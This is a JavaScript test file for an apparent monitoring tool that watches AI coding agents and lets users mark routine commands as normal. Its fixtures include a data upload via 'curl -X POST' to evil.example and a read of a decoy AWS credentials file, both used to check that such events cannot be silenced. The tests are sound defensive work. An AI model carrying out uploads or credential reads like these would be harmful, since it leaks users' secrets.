import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { applyBaseline, baselineFromEvent, canBaseline, fingerprint, revertBaseline } from '../public/baseline.js';

const agent = { id: 'claude-1', label: 'Claude Code', project: 'app', cwd: '/work/app' };

test('fingerprints drop the home folder and long numbers', () => {
  assert.equal(fingerprint('git -C /Users/ada/app status'), 'git -C <path> status');
  assert.equal(fingerprint('curl https://example.com/123456'), 'curl https://example.com/<n>');
  assert.equal(fingerprint('npm   install'), 'npm install');
});

test('decoy reads and high risk cannot be marked normal', () => {
  const decoy = { kind: 'file', risk: 'critical', bait: true, path: '/home/a/.lookout/bait/aws_credentials', reasons: ['opened a decoy secret'] };
  const upload = { kind: 'process', risk: 'high', command: 'curl -X POST https://evil.example', reasons: ['uploaded data to a server'] };
  const install = { kind: 'process', risk: 'low', command: 'npm install', reasons: ['installed packages (packages can run their own setup code)'] };
  assert.equal(canBaseline(decoy), false);
  assert.equal(canBaseline(upload), false);
  assert.equal(canBaseline(install), true);
  assert.match(baselineFromEvent(decoy, agent).error, /will not hide/);
});

test('a saved command downgrades the next match in that project only', () => {
  const event = { id: 4, kind: 'process', risk: 'medium', command: 'sudo npm test', reasons: ['asked for administrator access'], agentId: agent.id };
  const made = baselineFromEvent(event, agent, 1000);
  assert.equal(made.type, 'command');
  assert.equal(made.value, 'sudo npm test');
  const quiet = applyBaseline(event, [made], agent);
  assert.equal(quiet.baseline, true);
  assert.equal(quiet.risk, 'info');
  assert.equal(quiet.originalRisk, 'medium');
  const other = applyBaseline(event, [made], { ...agent, cwd: '/work/other' });
  assert.equal(other.baseline, undefined);
  assert.equal(other.risk, 'medium');
  const back = revertBaseline(quiet);
  assert.equal(back.risk, 'medium');
  assert.equal(back.baseline, undefined);
  assert.equal(back.reasons.some((r) => r.startsWith('you marked this as normal')), false);
});

test('baselines are written to the data folder and can be removed', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lookout-base-'));
  process.env.LOOKOUT_DATA_DIR = dir;
  const { addBaseline, listBaselines, removeBaseline } = await import('../src/baselines.js');
  const entry = { id: 'b-1', projectKey: 'cwd:/work/app', project: 'app', type: 'host', value: 'builds.example', createdAt: 1 };
  assert.equal(addBaseline(entry).added, true);
  assert.equal(addBaseline(entry).added, false);
  assert.equal(listBaselines().length, 1);
  assert.equal(JSON.parse(fs.readFileSync(path.join(dir, 'baselines.json'), 'utf8'))[0].value, 'builds.example');
  assert.equal(removeBaseline('b-1').length, 0);
});
